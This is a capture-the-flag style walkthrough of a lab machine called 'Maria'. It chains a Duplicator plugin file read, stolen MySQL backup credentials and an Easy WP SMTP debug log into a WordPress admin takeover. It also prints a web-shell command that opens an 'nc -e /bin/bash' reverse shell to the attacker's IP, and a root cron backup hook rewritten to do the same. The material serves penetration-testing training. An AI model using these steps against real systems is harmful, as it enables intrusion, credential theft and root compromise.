# Maria

### Enumeration

```
21/tcp    open   ftp       vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    5 0        0            4096 Sep 21  2018 automysqlbackup
80/tcp    open   http      Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.7.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Maria
3306/tcp  open   mysql     MySQL 5.5.5-10.3.27-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
```

```
$ wpscan --url http://192.168.153.167/ --api-token [REDACTED]

[+] WordPress version 5.7.1 identified
[I] duplicator v1.3.26
[I] easy-wp-smtp v1.4.1
```

```
$ searchsploit wordpress easy wp smtp
Unpatched WordPress Easy WP SMTP installs version 1.4.2 or earlier. - Sensitive Data Exposure

$ searchsploit wordpress duplicator
Wordpress Plugin Duplicator 1.3.26 - Unauthentica | php/webapps/49288.rb
Exploit: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read (Metasploit)
```

```
EASY WP SMTP - https://www.exploit-db.com/exploits/50420
URL = arg + "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../.." + file
```

[https://www.howtoforge.com/creating-mysql-backups-with-automysqlbackup-on-ubuntu-9.10](https://www.howtoforge.com/creating-mysql-backups-with-automysqlbackup-on-ubuntu-9.10)

```
> set FILEPATH /etc/default/automysqlbackup

# Username to access the MySQL server e.g. dbuser
USERNAME=backup

# Username to access the MySQL server e.g. password
PASSWORD=[REDACTED]

# Host name (or IP address) of MySQL server e.g localhost
DBHOST=localhost
```

```
$ mysql --host=192.168.153.167 -u backup -p

MariaDB [wordpress]> select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$[REDACTED]                      |
+------------+------------------------------------+
1 row in set (0.145 sec)
```

I could not crack the password with rockyou.

[https://www.zdnet.com/article/zero-day-in-wordpress-smtp-plugin-abused-to-reset-admin-account-passwords/](https://www.zdnet.com/article/zero-day-in-wordpress-smtp-plugin-abused-to-reset-admin-account-passwords/)

With the other exploit, we can use mysql to identfiy the log file to get admin reset link.

Wordpress -> Forgot password -> admin

```
MariaDB [wordpress]> select option_value from wp_options where option_name = 'swpsmtp_options';
...
"enable_debug";i:1
"log_file_name";s:27:"618690b555268_debug_log.txt";}
```

```
> set FILEPATH /var/www/html/wordpress/wp-content/plugins/easy-wp-smtp/618690b555268_debug_log.txt

CLIENT -> SERVER: http://192.168.117.167/wp-login.php?action=rp&key=IRYLUQIp7Pl9LHhLkdbr&login=admin
```

Open the link, reset the admin password. Then login with new password.

### Initial Access

```
$ cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .
$ sudo zip plugin-shell.zip plugin-shell.php
```

Plugins -> Add New -> Upload Plugin -> Browse -> plugin-shell.zip -> Install Now

```
http://192.168.117.167/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=nc%20-e%20/bin/bash%20192.168.49.117%2080
```

### PrivEsc

```
/etc/cron.d/automysqlbackup

www-data@maria:/var/mail$ cat /etc/cron.d/automysqlbackup
*/1 * * * * root /usr/sbin/automysqlbackup


cat /etc/default/automysqlbackup
# Command run after backups (uncomment to use)
POSTBACKUP=/var/www/html/wordpress/backup_scripts/backup-post
```

```
cat << EOF > /var/www/html/wordpress/backup_scripts/backup-post              
> /bin/bash -c '/usr/bin/nc -e /bin/bash 192.168.49.117 80'
> EOF

chmod +x /var/www/html/wordpress/backup_scripts/backup-post
```
